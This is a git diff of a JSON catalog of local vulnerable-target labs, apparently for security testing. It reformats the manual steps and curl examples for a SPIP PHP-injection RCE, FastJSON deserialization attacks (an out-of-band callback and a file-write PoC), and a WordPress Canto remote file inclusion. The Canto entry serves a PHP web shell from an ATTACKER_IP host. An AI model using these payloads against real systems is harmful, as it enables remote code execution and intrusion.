@@ -736,22 +736,14 @@
       "nuclei": [
         "vt-2025-71243.nuclei.yaml"
       ],
-      "manual": {
-        "steps": [
-          "Start lab: docker-compose up -d",
-          "Wait for initialization (~60s)",
-          "Send exploit payload to the form page"
-        ]
-      },
+      "manual": [
+        "Start lab: docker-compose up -d",
+        "Wait for initialization (~60s)",
+        "Send exploit payload to the form page"
+      ],
       "curl_examples": [
-        {
-          "name": "RCE via _anciennes_valeurs injection",
-          "command": "curl -s \"http://localhost:8025/spip.php?page=contact&_anciennes_valeurs=x%27%2F%3E%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E%3Cinput%20value%3D%27x\"\n"
-        },
-        {
-          "name": "Detection check (non-destructive)",
-          "command": "curl -s \"http://localhost:8025/spip.php?page=contact&_anciennes_valeurs=x%27%2F%3E%3C%3Fphp%20echo%20%27VT_RCE_CHECK%27%3B%20%3F%3E%3Cinput%20value%3D%27x\" | grep -o \"VT_RCE_CHECK\"\n"
-        }
+        "RCE via _anciennes_valeurs injection: curl -s \"http://localhost:8025/spip.php?page=contact&_anciennes_valeurs=x%27%2F%3E%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E%3Cinput%20value%3D%27x\"",
+        "Detection check (non-destructive): curl -s \"http://localhost:8025/spip.php?page=contact&_anciennes_valeurs=x%27%2F%3E%3C%3Fphp%20echo%20%27VT_RCE_CHECK%27%3B%20%3F%3E%3Cinput%20value%3D%27x\" | grep -o \"VT_RCE_CHECK\""
       ]
     },
     "providers": {
@@ -848,23 +840,15 @@
       "nuclei": [
         "vt-vlife.nuclei.yaml"
       ],
-      "manual": {
-        "steps": [
-          "1. docker-compose up -d --build",
-          "2. Wait for application startup (~60s)",
-          "3. Send crafted JSON to POST /login with @type payload",
-          "4. Verify OOB callback or file write on server"
-        ]
-      },
+      "manual": [
+        "1. docker-compose up -d --build",
+        "2. Wait for application startup (~60s)",
+        "3. Send crafted JSON to POST /login with @type payload",
+        "4. Verify OOB callback or file write on server"
+      ],
       "curl_examples": [
-        {
-          "name": "FastJSON deserialization OOB test",
-          "command": "curl -s -X POST http://localhost:8288/vlife/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"@type\":\"java.net.Inet4Address\",\"val\":\"YOUR_CALLBACK_HOST\"}'\n"
-        },
-        {
-          "name": "FastJSON file write PoC",
-          "command": "curl -s -X POST http://localhost:8288/vlife/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"@type\":\"sun.rmi.server.MarshalOutputStream\",\"out\":{\"@type\":\"java.util.zip.InflaterOutputStream\",\"out\":{\"@type\":\"java.io.FileOutputStream\",\"file\":\"/tmp/pwned.txt\",\"append\":false},\"infl\":{\"input\":{\"array\":\"eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==\"}},\"bufLen\":1048576},\"protocolVersion\":1}'\n"
-        }
+        "FastJSON deserialization OOB test: curl -s -X POST http://localhost:8288/vlife/login -H \"Content-Type: application/json\" -d '{\"@type\":\"java.net.Inet4Address\",\"val\":\"YOUR_CALLBACK_HOST\"}'",
+        "FastJSON file write PoC: curl -s -X POST http://localhost:8288/vlife/login -H \"Content-Type: application/json\" -d '{\"@type\":\"sun.rmi.server.MarshalOutputStream\",\"out\":{\"@type\":\"java.util.zip.InflaterOutputStream\",\"out\":{\"@type\":\"java.io.FileOutputStream\",\"file\":\"/tmp/pwned.txt\",\"append\":false},\"infl\":{\"input\":{\"array\":\"eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==\"}},\"bufLen\":1048576},\"protocolVersion\":1}'"
       ]
     },
     "providers": {
@@ -960,24 +944,16 @@
       "nuclei": [
         "vt-2023-3452.nuclei.yaml"
       ],
-      "manual": {
-        "steps": [
-          "1. docker-compose up -d --build",
-          "2. Complete WordPress setup at http://localhost:8022/",
-          "3. Activate Canto plugin in wp-admin",
-          "4. Start attacker server: mkdir -p /tmp/wp-admin && echo '<?php system($_GET[\"cmd\"]); ?>' > /tmp/wp-admin/admin.php && cd /tmp && python3 -m http.server 9090",
-          "5. Trigger RFI: curl 'http://localhost:8022/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://HOST_IP:9090&cmd=id'"
-        ]
-      },
+      "manual": [
+        "1. docker-compose up -d --build",
+        "2. Complete WordPress setup at http://localhost:8022/",
+        "3. Activate Canto plugin in wp-admin",
+        "4. Start attacker server: mkdir -p /tmp/wp-admin && echo '<?php system($_GET[\"cmd\"]); ?>' > /tmp/wp-admin/admin.php && cd /tmp && python3 -m http.server 9090",
+        "5. Trigger RFI: curl 'http://localhost:8022/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://HOST_IP:9090&cmd=id'"
+      ],
       "curl_examples": [
-        {
-          "name": "Check vulnerable endpoint exists",
-          "command": "curl -s -o /dev/null -w \"%{http_code}\" http://localhost:8022/wp-content/plugins/canto/includes/lib/download.php\n"
-        },
-        {
-          "name": "Trigger RFI with command execution",
-          "command": "curl -s \"http://localhost:8022/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://ATTACKER_IP:9090&cmd=id\"\n"
-        }
+        "Check vulnerable endpoint exists: curl -s -o /dev/null -w \"%{http_code}\" http://localhost:8022/wp-content/plugins/canto/includes/lib/download.php",
+        "Trigger RFI with command execution: curl -s \"http://localhost:8022/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://ATTACKER_IP:9090&cmd=id\""
       ]
     },
     "providers": {
